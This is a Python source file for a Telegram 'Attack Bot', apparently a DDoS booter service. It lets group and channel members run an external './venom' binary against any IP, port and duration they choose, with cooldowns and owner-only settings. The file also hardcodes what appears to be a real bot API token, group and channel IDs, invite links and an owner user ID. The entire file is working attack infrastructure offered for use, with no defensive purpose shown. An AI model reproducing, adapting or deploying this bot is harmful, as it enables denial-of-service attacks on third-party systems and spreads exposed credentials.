import telebot
import subprocess
import shlex
import time
from threading import Thread
from html import escape

# Configuration
API_TOKEN = '7909374116:AAESmzi6HalD3N_3ZaelAsNKliMJVbU3th0'  # Replace with your actual API token
GROUP_ID = -1002422164782  # Replace with your actual group ID (negative value)
CHANNEL_ID = -1002533823555  # Replace with your actual channel ID (negative value)
CHANNEL_LINK = 'https://t.me/+e8QxfHRBB4gxMDQ9'  # Replace with your actual channel link
GROUP_LINK = 'https://t.me/+Dy0_lRT2rhBlZTM1'  # Replace with your actual group link
OWNER_ID = 5730843286  # Replace with your actual Telegram user ID (as a number)

bot = telebot.TeleBot(API_TOKEN)

# Cooldown settings
cooldown_time = 10  # in seconds
last_attack_time = {}

# Max duration settings
max_duration = 60  # in seconds; default max duration

# Additional settings
settings = {
    'cooldown_time': cooldown_time,
    'max_duration': max_duration,
}

def allowed_chat(message):
    """
    Returns True if the message is coming from the designated group
    or if the sender is the owner.
    """
    return message.chat.id == GROUP_ID or message.from_user.id == OWNER_ID

def attack(ip, port, time_duration, chat_id):
    """Function to handle the attack command."""
    command = f"./venom {ip} {port} {time_duration}"  # Update this path if necessary
    try:
        process = subprocess.Popen(shlex.split(command),
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        exit_code = process.returncode

        if exit_code == 0:
            # Build HTML formatted message using newline characters
            msg = (
                f"&#9989; Attack started on IP: <code>{escape(ip)}</code>\n"
                f"Port: <code>{escape(port)}</code>\n"
                f"for <code>{escape(time_duration)}</code> seconds."
            )
            bot.send_message(chat_id, msg, parse_mode='HTML')
        else:
            error_msg = stderr.decode('utf-8', errors='replace')
            msg = f"&#9888; An error occurred: <code>{escape(error_msg)}</code>"
            bot.send_message(chat_id, msg, parse_mode='HTML')
    except Exception as e:
        msg = f"&#9888; An unexpected error occurred: <code>{escape(str(e))}</code>"
        bot.send_message(chat_id, msg, parse_mode='HTML')

def is_user_in_channel(user_id):
    """Check if the user is in the channel."""
    try:
        user_status = bot.get_chat_member(CHANNEL_ID, user_id)
        return user_status.status != 'left'
    except Exception:
        return False

def is_user_in_group(user_id):
    """Check if the user is in the group."""
    try:
        user_status = bot.get_chat_member(GROUP_ID, user_id)
        return user_status.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not allowed_chat(message):
        bot.reply_to(message, f"This bot can only be used in the specified group. Please join here: {GROUP_LINK}")
        return

    # Build help text using HTML formatting with newline characters
    welcome_text = (
        "<b>Welcome to the Attack Bot!</b>\n"
        "<i>Please join our channel to use this bot.</i>\n"
        f"Join here: <a href='{CHANNEL_LINK}'>{CHANNEL_LINK}</a>\n"
        f"Join our group here: <a href='{GROUP_LINK}'>{GROUP_LINK}</a>\n\n"
        "<b>Available Commands:</b>\n"
        "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time in seconds&gt;</code> - Start an attack\n"
        "<code>/setcooldown &lt;seconds&gt;</code> - Set cooldown time (Owner only)\n"
        "<code>/setmaxduration &lt;seconds&gt;</code> - Set maximum duration (Owner only)\n"
        "<code>/botsettings</code> - View current bot settings\n"
        "<code>/editsettings</code> - Edit multiple settings (Owner only)"
    )
    bot.reply_to(message, welcome_text, parse_mode='HTML')

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    if not allowed_chat(message):
        bot.reply_to(message, f"This command can only be used in the designated group. Please join here: {GROUP_LINK}")
        return

    user_id = message.from_user.id
    if user_id != OWNER_ID:
        if not is_user_in_channel(user_id):
            bot.reply_to(message, f"You need to join the channel first to use this bot.\nJoin here: {CHANNEL_LINK}", parse_mode='HTML')
            return
        if not is_user_in_group(user_id):
            bot.reply_to(message, f"You need to be a member of the group to use this bot.\nJoin here: {GROUP_LINK}", parse_mode='HTML')
            return

    current_time = time.time()
    if user_id in last_attack_time and (current_time - last_attack_time[user_id]) < settings['cooldown_time']:
        remaining_time = settings['cooldown_time'] - (current_time - last_attack_time[user_id])
        bot.reply_to(message, f"⏳ Please wait {int(remaining_time)} seconds before using this command.")
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "🛑 Usage: /attack <ip> <port> <time in seconds>")
        return

    ip = args[1]
    port = args[2]
    time_duration = args[3]
    if not valid_ip(ip):
        bot.reply_to(message, "❌ Invalid IP address format.")
        return
    if not port.isdigit() or not (1 <= int(port) <= 65535):
        bot.reply_to(message, "❌ Invalid port number. It must be between 1 and 65535.")
        return
    if not time_duration.isdigit() or int(time_duration) <= 0 or int(time_duration) > settings['max_duration']:
        bot.reply_to(message, f"❌ Invalid time. It must be a positive integer up to {settings['max_duration']} seconds.")
        return

    Thread(target=attack, args=(ip, port, time_duration, message.chat.id)).start()
    last_attack_time[user_id] = current_time

@bot.message_handler(commands=['setcooldown', 'set_cooldown'])
def set_cooldown(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit() or int(args[1]) <= 0:
        bot.reply_to(message, "🛑 Usage: /setcooldown <seconds>")
        return

    settings['cooldown_time'] = int(args[1])
    msg = f"✅ Cooldown time set to <code>{settings['cooldown_time']}</code> seconds."
    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['setmaxduration', 'set_max_duration'])
def set_max_duration(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    args = message.text.split()
    if len(args) != 2 or not args[1].isdigit() or int(args[1]) <= 0:
        bot.reply_to(message, "🛑 Usage: /setmaxduration <seconds>")
        return

    settings['max_duration'] = int(args[1])
    msg = f"✅ Max duration set to <code>{settings['max_duration']}</code> seconds."
    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['botsettings', 'bot_settings'])
def bot_settings(message):
    if not allowed_chat(message):
        bot.reply_to(message, f"This command can only be used in the designated group. Please join here: {GROUP_LINK}")
        return

    settings_message = (
        "🛠️ <b>Current Bot Settings:</b>\n"
        f"Cooldown Time: <code>{settings['cooldown_time']}</code> seconds\n"
        f"Max Duration: <code>{settings['max_duration']}</code> seconds"
    )
    bot.reply_to(message, settings_message, parse_mode='HTML')

@bot.message_handler(commands=['editsettings', 'edit_settings'])
def edit_settings(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ You do not have permission to use this command.")
        return

    help_text = (
        "Please provide the new cooldown time and max duration separated by a space.\n"
        "Usage: <code>/editsettings &lt;cooldown_time&gt; &lt;max_duration&gt;</code>"
    )
    bot.reply_to(message, help_text, parse_mode='HTML')
    bot.register_next_step_handler(message, update_settings)

def update_settings(message):
    try:
        values = list(map(int, message.text.split()))
        if len(values) != 2 or any(value <= 0 for value in values):
            bot.reply_to(message, "🛑 Invalid input. Please enter positive integers.", parse_mode='HTML')
            return
        
        settings['cooldown_time'], settings['max_duration'] = values
        bot.reply_to(message, "✅ Settings updated successfully!", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, "🛑 An error occurred while updating settings. Please try again.", parse_mode='HTML')

def valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not (0 <= int(part) <= 255):
            return False
    return True

# Start polling
bot.polling()
